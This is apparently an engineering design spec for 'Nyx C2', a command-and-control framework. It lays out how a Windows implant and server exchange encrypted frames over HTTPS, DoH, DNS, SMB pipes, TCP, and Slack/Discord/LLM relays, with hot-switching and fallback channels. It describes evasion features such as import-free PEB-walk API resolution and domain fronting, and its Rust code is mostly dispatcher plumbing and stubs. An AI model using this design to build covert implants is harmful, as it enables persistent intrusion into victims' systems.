# spec-1: 信道无关帧层 + 双侧 Dispatcher(多信道基座接线)

**日期**: 2026-07-14
**状态**: ✅ 已实现并验证 (2026-07-14)
**决策**: 双层架构(PIC implant 用 FFI,nyx-transport 作 dev/reference)+ 运行时热切换
**前置**: 无(本 spec 是后续所有信道 spec 的前提)

> **实现完成**: 所有 spec(spec-1 ~ spec-7)已全部实现并编译通过。
> - spec-1 基座: commit `7f586ca`
> - spec-2 DoH+SMB: commit `c7aa6e1`
> - spec-3 TCP: commit `c7aa6e1`
> - spec-4 DNS: commit `c7aa6e1`
> - spec-6 External C2: commit `c7aa6e1`
> - spec-7 HTTP 增强: commit `28806a1`
> - safe_http: commit `8454134`
> - SetChannel fix: commit `aa8b6a3`
> - TUI /channel: commit `10a6631`
>
> **Windows Server 2019 验证**: 7 个 HTTP 端点全部在线(/beacon /doh /dns /extc2/*),
> beacon check-in + Ping 任务 round-trip 通过, SetChannel wire 协议端到端通过。

---

## 1. 问题陈述

### 1.1 现状

Nyx C2 运行时只有 **HTTP(S) POST → `/beacon`** 一种传输信道:

- **Implant 端**(`crates/implant-win/src/transport.rs`):`channel_post_frame()`(L53-70)声称支持 7 个 `Channel` 变体,但实现是**所有变体都调同一个 `post_frame()`(WinHTTP POST),只换 URL path**(`/dns`、`/slack`、`/llm`、`/mcp`);`SmbPipe` 直接 `return None`。这是假的信道切换。
- **Server 端**(`crates/server/src/lib.rs:435`):唯一接收 implant 流量的路由是 `POST /beacon`。没有 DoH 解析器、SMB pipe listener、TCP listener 等其他信道的接收端点。
- **抽象层**(`crates/transport/src/traits.rs`):`Transport` trait + `TransportStack`(优先级故障转移)设计完整,6 个通道实现(doh_dns/slack_api/llm_api/mcp/smb_pipe/webtransport)代码完整,但**整个 `nyx-transport` crate 在运行时零实例化**——implant-win 不依赖它,server 也不 import trait/stack。
- **配置层**(`crates/implant-win/src/config.rs:28`):`Config` 只有 `server_host/port/uri/sleep/jitter/use_tls`,**没有 channel 字段**。无法在 build-time 指定主信道或 fallback 列表。

### 1.2 目标

建立一套**信道无关的 dispatch 基座**,让后续每个信道(DoH/SMB/TCP/DNS/External C2)都能:
1. 在 implant 端作为一个 `Channel` 变体接入,运行时通过 `SetChannel` 热切换
2. 在 server 端挂一个对应的接收端点,解出的 frame 走同一套 `handle_beacon` → task dispatch
3. 配置层支持 build-time 指定 primary channel + fallback list

### 1.3 非目标(留给后续 spec)

- 任何具体信道的实现细节(DoH 的 A 记录信令、SMB 的 Everyone ACL、TCP 的 bind/reverse、DNS 的 TXT 下发等)——这些分别在 spec-2~spec-5
- HTTP 信道增强(host rotation/热切换/domain fronting/proxy)——spec-7
- 新增 Discord/MS Teams external C2——spec-6
- WebTransport(QUIC)接线——依赖 quinn,优先级最低,暂不规划

---

## 2. 架构设计

### 2.1 三层结构

```
┌─ Layer 3: 线协议(不变) ──────────────────────────────────┐
│  crates/protocol  Frame: ChaCha20-Poly1305 加密容器        │
│  [32B pubkey][8B counter][4B ct_len][ct||16B tag]         │
│  信道无关——所有信道的 frame 字节格式完全相同                 │
└───────────────────────────────────────────────────────────┘
          ▲                                      ▲
┌─ Implant Layer 2: Channel Dispatcher ───┐  ┌─ Server Layer 2: 多端点 ──────┐
│  implant-win/src/channels/mod.rs         │  │  HTTP routes (axum):          │
│                                          │  │   POST /beacon  → handle_frame│
│  trait ChannelSend {                     │  │   POST /doh     → handle_frame│
│    fn send_recv(&mut self, frame)        │  │   POST /extc2   → handle_frame│
│      -> Option<Vec<u8>>;                │  │  Raw listeners (tokio):        │
│  }                                       │  │   SMB pipe server             │
│                                          │  │   TCP beacon listener          │
│  match active_channel {                  │  │   DNS listener (UDP 53)        │
│    Https  => winhttp_send_recv()         │  │     ↓ 全部汇入                  │
│    DohDns => doh_send_recv()  (spec-2)   │  │  handle_frame() → decode →     │
│    Dns    => dns_send_recv()  (spec-4)   │  │  handle_beacon() (现有逻辑)     │
│    SmbPipe=> smb_send_recv()  (spec-2)   │  └────────────────────────────────┘
│    Tcp   => tcp_send_recv()   (spec-3)   │
│    ExtC2 => extc2_send_recv() (spec-5/6) │
│  }                                       │
│                                          │
│  active_channel: AtomicU8,运行时可改      │
│  fallback list: build-time 配置          │
└──────────────────────────────────────────┘
          ▲
┌─ Layer 1: FFI 原语 ──────────────────────────────────────┐
│  implant-win/src/ffi/                                     │
│   winhttp.rs (现有,PEB walk)                              │
│   ws2_32.rs  (新增:Winsock TCP/DNS,PEB walk)             │
│   kernel32.rs(现有 named pipe FFI,从 smb_pipe.rs 迁移)   │
│  全部 PEB walk 解析,无 IAT,不链接 std                    │
└──────────────────────────────────────────────────────────┘
```

### 2.2 核心设计决策

#### 决策 1: PIC implant 不用 trait object

`nyx-transport` 的 `Transport` trait 用 `Box<dyn Transport>`,需要 alloc + vtable。PIC implant 在 no_std + bump allocator 下,用 trait object 不合适(且 TransportStack 的 `Vec<ChannelSlot>` 需要 heap)。

**方案**: implant 端不用 `dyn`,用一个 **`enum` + `match` dispatcher**(PIC 友好,编译期确定,无 vtable):

```rust
// implant-win/src/channels/mod.rs
/// 当前激活的信道。运行时可通过 SetChannel 命令热切换。
/// 存储在 static AtomicU8,beacon_loop 每个周期读取。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum Channel {
    Https   = 0,
    DohDns  = 1,
    Dns     = 2,   // 新增:原生 DNS Beacon (spec-4)
    SmbPipe = 3,
    Tcp     = 4,   // 新增:TCP Beacon (spec-3)
    SlackApi = 5,  // External C2 (spec-6)
    LlmApi   = 6,
    Mcp      = 7,
    DiscordApi = 8, // 新增 (spec-6)
}
```

注意:编号重新分配(旧的 `Channel` enum 里 SlackApi=2/LlmApi=3/Mcp=4/WebTrans=5/SmbPipe=6 被废弃,因为 wire 协议的 `SetChannel{channel: u8}` 只传一个 u8,implant 本地 match 这个 u8,server 不需要知道编号含义)。

#### 决策 2: Dispatcher 接口签名

现有 `channel_post_frame(host, port, body, use_tls) -> Option<Vec<u8>>` 签名不够通用——SMB/TCP 信道不需要 host:port(它们连的是 pipe name 或 peer address),DoH 需要 resolver URL,DNS 需要 DNS server。

**方案**: 引入 **per-channel state**。每个信道有自己的配置,beacon_loop 传一个 `ChannelCtx`:

```rust
/// 所有信道共享的上下文(从 Config 构造一次,beacon_loop 持有)。
pub struct ChannelCtx {
    // HTTPS / DoH / External C2 共用
    pub server_host: heap::String,
    pub server_port: u16,
    pub use_tls: bool,
    // DoH 专用 (spec-2)
    pub doh_resolvers: &'static [&'static [u8]],  // build-time bake
    // SMB 专用 (spec-2)
    pub smb_pipe_name: &'static [u8],             // build-time bake, e.g. b"\\.\pipe\nyx_abc"
    // TCP beacon 专用 (spec-3)
    pub tcp_peer: Option<(heap::String, u16)>,    // 运行时 Connect 命令设置
    // External C2 专用 (spec-6)
    pub extc2_token: &'static [u8],               // build-time bake (Slack/Discord bot token)
}
```

Dispatcher 统一签名:

```rust
/// 发送一个加密 frame,返回 server 的响应 frame(或 None = 信道失败)。
/// 这是所有信道的统一接口。beacon_loop 调这个,不再直接调 post_frame。
pub unsafe fn dispatch_send_recv(
    ctx: &ChannelCtx,
    active: Channel,
    frame: &[u8],
) -> Option<Vec<u8>> {
    match active {
        Channel::Https    => crate::channels::https::send_recv(ctx, frame),
        Channel::DohDns   => crate::channels::doh::send_recv(ctx, frame),     // spec-2
        Channel::Dns      => crate::channels::dns::send_recv(ctx, frame),     // spec-4
        Channel::SmbPipe  => crate::channels::smb::send_recv(ctx, frame),     // spec-2
        Channel::Tcp      => crate::channels::tcp::send_recv(ctx, frame),     // spec-3
        Channel::SlackApi => crate::channels::extc2::slack_send_recv(ctx, frame),  // spec-6
        Channel::LlmApi   => crate::channels::extc2::llm_send_recv(ctx, frame),
        Channel::Mcp      => crate::channels::extc2::mcp_send_recv(ctx, frame),
        Channel::DiscordApi => crate::channels::extc2::discord_send_recv(ctx, frame),
    }
}
```

**过渡策略**: spec-1 只实现 `Https` 变体(调现有的 `winhttp::post_frame`),其余变体返回 `None` + 日志标记 `b"ERR_CH_UNIMPL_N"`(N = channel 编号)。后续 spec 逐个填充。

#### 决策 3: Beacon loop 改造

`beacon.rs` 的 `beacon_loop()` 现在直接调 `crate::transport::channel_post_frame()`。改为:

```rust
// beacon_loop 内部,替换所有 channel_post_frame 调用:
let active = crate::channels::get_active();  // 读 AtomicU8
let body = match crate::channels::dispatch_send_recv(&ctx, active, &frame) {
    Some(b) => b,
    None => {
        // 信道失败——尝试 fallback
        if let Some(fb) = crate::channels::next_fallback(active) {
            crate::channels::set_active(fb);
            // 下一周期用 fallback 重试;本周期跳过
        }
        continue;
    }
};
```

Fallback 逻辑简化版(不用 TransportStack 的复杂状态机):

```rust
/// build-time 配置的 fallback 顺序,e.g. [Https, DohDns, Dns]
/// 运行时 primary 失败后,按这个顺序试。
static FALLBACK_CHAIN: &[Channel] = baked::FALLBACK_CHAIN; // build.rs bake

/// primary 失败后,返回 fallback chain 里的下一个可用信道。
/// 如果都试过了,返回 None(beacon_loop 进入长 sleep 重试 primary)。
pub fn next_fallback(current: Channel) -> Option<Channel> {
    let idx = FALLBACK_CHAIN.iter().position(|&c| c == current)?;
    FALLBACK_CHAIN.get(idx + 1).copied()
}
```

#### 决策 4: Server 端多端点框架

**HTTP 类信道**(HTTPS/DoH/External C2):都走 axum router,每个加一个 route,handler 提取 body → 调统一的 `handle_frame()`:

```rust
// server/src/lib.rs router() 内:
// 现有 /beacon 不变。新增其他 HTTP 信道的路由:
let beacon_routes = Router::new()
    .route("/beacon", post(beacon))           // HTTPS (现有)
    .route("/doh", post(doh_beacon))          // DoH (spec-2): body 是 DoH-wrapped frame
    .route("/extc2/slack", post(extc2_beacon))// Slack (spec-6)
    .route("/extc2/discord", post(extc2_beacon))
    .route("/extc2/llm", post(extc2_beacon))
    .route("/extc2/mcp", post(extc2_beacon))
    .route_layer(DefaultBodyLimit::max(BEACON_BODY_LIMIT));
```

每个 handler 做信道特定的"拆包"(DoH 要从 DNS-wire 提取 frame,Slack 要从 JSON 提取),然后调同一个 `handle_frame()`:

```rust
/// 信道无关的核心:接收一个已解包的加密 frame,走完整的 beacon 处理。
/// 现有 handle_beacon() 的逻辑(减去 HTTP envelope 反转)提取到这里。
/// 所有信道的 handler 最终都调这个。
fn handle_frame(
    st: &AppState,
    peer: &SocketAddr,
    raw_frame: &[u8],    // 已经拆包的、信封外的裸 frame
) -> anyhow::Result<Vec<u8>> {
    // 现有 handle_beacon() 的 L720 之后的逻辑:
    // parse_frame → session lookup → decrypt → task dispatch → encode response
}
```

**Raw socket 类信道**(SMB/TCP/DNS):不经过 axum,在 `main.rs` 启动独立的 tokio listener:

```rust
// server/src/main.rs 内,与 HTTP listener 并行:
// 这些 listener 只有在 config 里启用时才启动(默认关闭)。

// spec-2: SMB pipe server (Windows only)
#[cfg(target_os = "windows")]
if config.enable_smb_listener {
    let st = state.clone();
    tokio::spawn(async move { smb_pipe_server::serve(st).await });
}

// spec-3: TCP beacon listener
if let Some(port) = config.tcp_beacon_port {
    let st = state.clone();
    tokio::spawn(async move { tcp_beacon_server::serve(st, port).await });
}

// spec-4: DNS listener
if let Some(port) = config.dns_port {
    let st = state.clone();
    tokio::spawn(async move { dns_server::serve(st, port).await });
}
```

这些 listener 的 `serve()` 内部:accept 连接 → 按信道协议拆包 → 调 `handle_frame()` → 按信道协议打包响应 → 回写。

#### 决策 5: 配置层扩展

`Config` 增加 channel 字段(build-time bake):

```rust
// implant-win/src/config.rs
pub struct Config {
    // ... 现有字段 ...
    pub primary_channel: u8,         // Channel enum 的值,默认 0 (Https)
    pub fallback_channels: u8,       // bitmap:bit N 设置 = Channel N 在 fallback chain 里
    // 信道特定参数(spec-2~6 用):
    pub doh_resolver_host: heap::String,   // e.g. "cloudflare-dns.com"
    pub smb_pipe_name: heap::String,       // e.g. "\\.\pipe\nyx_abc123"
    pub extc2_api_host: heap::String,      // e.g. "slack.com" / "discord.com"
}
```

wire 格式(`config.rs::decode()` + `config_placeholder.rs`):

```text
现有: str(host) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
新增: | u8(primary_channel) | u8(fallback_bitmap)
      | str(doh_resolver_host) | str(smb_pipe_name) | str(extc2_api_host)
```

build.rs 同步扩展 `bake_config()`。server 的 `generate_implant` 也同步 patch 这些字段到 `.nyx_cfg`。

**向后兼容**: decode 时用 `r.remaining()` 检查——旧 config(没有新字段)default 到 Https-only,`fallback_bitmap=0`,`doh/smb/extc2` 字段为空串。

---

## 3. 文件清单

### 3.1 新建文件

| 文件 | 用途 |
|---|---|
| `crates/implant-win/src/channels/mod.rs` | Channel enum + dispatcher + fallback 逻辑 + ChannelCtx |
| `crates/implant-win/src/channels/https.rs` | HTTPS 信道(包装现有 winhttp post_frame,spec-1 实现) |
| `crates/implant-win/src/channels/doh.rs` | DoH 信道桩(spec-2 填充) |
| `crates/implant-win/src/channels/dns.rs` | DNS 信道桩(spec-4 填充) |
| `crates/implant-win/src/channels/smb.rs` | SMB 信道桩(spec-2 填充) |
| `crates/implant-win/src/channels/tcp.rs` | TCP 信道桩(spec-3 填充) |
| `crates/implant-win/src/channels/extc2.rs` | External C2 桩(spec-6 填充) |
| `crates/server/src/handle_frame.rs` | 从 handle_beacon 提取的信道无关核心 |

### 3.2 修改文件

| 文件 | 改动 |
|---|---|
| `crates/implant-win/src/lib.rs` | `mod channels;` 声明 |
| `crates/implant-win/src/transport.rs` | 旧 `Channel` enum + `channel_post_frame` 标记 `#[deprecated]`,重导出 `channels::Channel` 保持 beacon.rs 的 SetChannel 命令兼容。最终 transport.rs 的 WinHTTP 逻辑移到 `channels/https.rs`。 |
| `crates/implant-win/src/beacon.rs` | `beacon_loop()` + `beacon_oneshot()` 里所有 `channel_post_frame` 调用改为 `channels::dispatch_send_recv`。`SetChannel` 命令的 match 改用新编号。增加 fallback 重试逻辑。 |
| `crates/implant-win/src/config.rs` | `Config` 增加 channel 字段;`decode()` 扩展。 |
| `crates/implant-win/src/config_placeholder.rs` | `load_runtime_config()` 扩展 decode 新字段。 |
| `crates/implant-win/build.rs` | `bake_config()` 增加新字段的序列化。 |
| `crates/server/src/lib.rs` | `handle_beacon()` 拆分:HTTP envelope 反转逻辑留在 `beacon()` handler,核心提取到 `handle_frame()`。`router()` 增加 extc2 路由桩(spec-1 先不挂 handler,或挂占位 404)。 |
| `crates/server/src/main.rs` | 增加 config 读取(SMB/TCP/DNS listener 启动开关,spec-1 先不实现 listener,只留 TODO 注释)。 |

---

## 4. 数据流

### 4.1 正常 HTTPS beacon 周期(改造后,行为不变)

```
beacon_loop
  → encode_frame(pubkey, counter, key, payload) → frame: Vec<u8>
  → channels::dispatch_send_recv(&ctx, Channel::Https, &frame)
    → channels::https::send_recv(ctx, frame)
      → winhttp::post_frame(host, port, "/beacon", frame, tls)  [现有逻辑]
    → response: Vec<u8>
  → parse_frame(response) → open_frame_dir(key, ...) → tasks
  → execute(tasks)
```

### 4.2 SetChannel 热切换

```
operator: POST /api/task { SetChannel { channel: 1 } }  // 切到 DoH
server → encode into task batch → 下个 beacon 周期下发
implant beacon_loop:
  → 收到 Command::SetChannel { channel: 1 }
  → channels::set_active(Channel::DohDns)  // 写 AtomicU8
  → Response::Output("Channel set to: doh-dns")
  → 下个周期:dispatch_send_recv 读到 active=DohDns → 调 doh::send_recv()
```

### 4.3 Fallback 故障转移

```
beacon_loop,active=Https
  → dispatch_send_recv(ctx, Https, frame) → None (server 不可达)
  → channels::next_fallback(Https) → Some(DohDns)  // fallback chain 里下一个
  → channels::set_active(DohDns)
  → continue (本周期跳过,下周期用 DoH)
  → 下个周期:dispatch_send_recv(ctx, DohDns, frame) → 走 DoH 信道
  → 若 DoH 也失败 → next_fallback(DohDns) → Some(Dns) → 切 DNS
  → 若 DNS 也失败 → next_fallback 返回 None → 长 sleep + 重试 primary(Https)
```

### 4.4 Server 多端点接收

```
HTTPS implant → POST /beacon → beacon() handler
  → 反转 HTTP envelope → handle_frame(st, peer, raw_frame)
  → session/decrypt/task → response frame
  → shape_beacon_response() → HTTP response

DoH implant → POST /doh → doh_beacon() handler (spec-2)
  → 从 DNS-wire 提取 frame → handle_frame(st, peer, raw_frame)
  → response frame → 包回 DNS-wire → HTTP response

SMB implant → named pipe write → smb_pipe_server (spec-2)
  → 读 pipe → 提取 frame → handle_frame(st, peer, raw_frame)
  → response → 写回 pipe
```

---

## 5. 兼容性与迁移

### 5.1 旧 implant 二进制(不重新生成)

- 现有 `.nyx_cfg` section 没有 channel 字段 → `load_runtime_config()` decode 时 `remaining()==0` → default 到 Https-only。**行为完全不变**。
- 旧 `Command::SetChannel { channel: N }` 用的旧编号(SlackApi=2 等)→ beacon.rs 的 SetChannel handler 做编号映射(旧 2→新 SlackApi,旧 6→新 SmbPipe),保证旧 server 能控制新 implant,新 server 能控制旧 implant 的 HTTPS 信道。

### 5.2 Server 向后兼容

- `handle_frame()` 是从 `handle_beacon()` 提取的纯重构,行为不变。`beacon()` handler 先做 HTTP envelope 反转再调 `handle_frame()`,等价于现有逻辑。
- 新增的路由(`/doh`、`/extc2/*`)spec-1 不挂真实 handler(返回 404 或 `StatusCode::NOT_IMPLEMENTED`),spec-2~6 逐个填充。

### 5.3 编译验证

- spec-1 完成后,`cargo check --workspace` 必须通过。
- `cargo test -p nyx-protocol`(wire round-trip)必须通过。
- Windows 交叉编译 implant-win 必须通过(`cargo check --target x86_64-pc-windows-gnu` 或 CI 用的 target)。

---

## 6. 验证标准

spec-1 完成时,以下必须为真:

1. ✅ `beacon_loop` 不再直接调 `transport::channel_post_frame`,改走 `channels::dispatch_send_recv`。
2. ✅ HTTPS 信道(`channels::https`)行为与现有 `post_frame` 完全一致(同一个 WinHTTP 调用链)。
3. ✅ 其他信道变体(DoH/DNS/SMB/TCP/ExtC2)的 `send_recv` 存在但返回 `None` + diag marker。
4. ✅ `SetChannel` 命令用新编号工作;旧编号通过映射兼容。
5. ✅ Fallback chain 逻辑存在(primary 失败 → next_fallback → 切换)。
6. ✅ Config 的 channel 字段 decode 正确(有新字段读新字段,没有 default)。
7. ✅ Server `handle_frame()` 提取完成,`beacon()` handler 行为不变。
8. ✅ `cargo check --workspace` 通过。

---

## 7. 风险与缓解

| 风险 | 影响 | 缓解 |
|---|---|---|
| beacon_loop 改造引入回归(check-in/task loop 跑不通) | 高——生产 implant 不可用 | spec-1 只动 dispatch 路径,不改 crypto/frame/task 逻辑;HTTPS 路径保持完全等价;用 `beacon_oneshot` 集成测试验证 |
| Config wire 格式扩展破坏旧 `.nyx_cfg` patch | 中——server 生成的 implant 无法启动 | decode 用 `remaining()` 向后兼容;build.rs 和 server generate_implant 同步改;旧 config default 到 Https-only |
| `Channel` 编号变更破坏旧 server 与新 implant 的 SetChannel | 中——切信道失败 | beacon.rs 内做旧→新编号映射;过渡期保留旧编号常量 |
| 拆分 handle_beacon 引入 envelope 反转 bug | 中——check-in 静默失败 | 提取是纯重构,逻辑等价;现有 profile 集成测试覆盖 |

---

## 8. 后续 spec 依赖

本 spec 完成后,以下 spec 可以**并行**开发(每个只填自己的 `channels/<name>.rs` + server 端点):

- **spec-2**: `channels/doh.rs` + `channels/smb.rs` + server `/doh` route + SMB pipe listener
- **spec-3**: `channels/tcp.rs` + server TCP beacon listener
- **spec-4**: `channels/dns.rs` + server DNS listener (UDP 53)
- **spec-5/6**: `channels/extc2.rs` + server `/extc2/*` routes
- **spec-7**: HTTP 增强(host rotation/domain fronting)——只改 `channels/https.rs` + server config

每个后续 spec 都假设本 spec 的 `dispatch_send_recv` + `ChannelCtx` + `handle_frame` 接口已就绪。
